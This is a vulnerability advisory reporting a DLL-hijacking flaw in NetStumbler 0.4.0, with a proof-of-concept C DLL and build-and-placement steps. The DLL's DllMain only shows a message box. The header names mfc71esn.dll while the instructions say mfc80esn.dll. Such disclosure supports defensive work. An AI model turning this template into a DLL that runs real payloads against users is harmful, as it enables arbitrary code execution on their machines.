source: http://www.securityfocus.com/bid/43913/info

NetStumbler is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.

NetStumbler 0.4.0 is vulnerable; other versions may also be affected. 

/*
=========================================================
NetStumbler - v0.4.0 DLL Hijacking Exploit (mfc71esn.dll) 
=========================================================

$ Program: NetStumbler
$ Version: 0.4.0
$ Download: http://www.netstumbler.com/
$ Date: 2010/10/08
 
Found by Pepelux <pepelux[at]enye-sec.org>
http://www.pepelux.org
eNYe-Sec - www.enye-sec.org

Tested on: Windows XP SP2 && Windows XP SP3

How  to use : 

1> Compile this code as mfc80esn.dll
	gcc -shared -o mfc80esn.dll thiscode.c
2> Move DLL file to the directory where NetStumbler is installed
3> Open any file recognized by NetStumbler
*/


#include <windows.h>
#define DllExport __declspec (dllexport)
int mes()
{
  MessageBox(0, "DLL Hijacking vulnerable", "Pepelux", MB_OK);
  return 0;
}
BOOL WINAPI  DllMain (
			HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
			{mes();}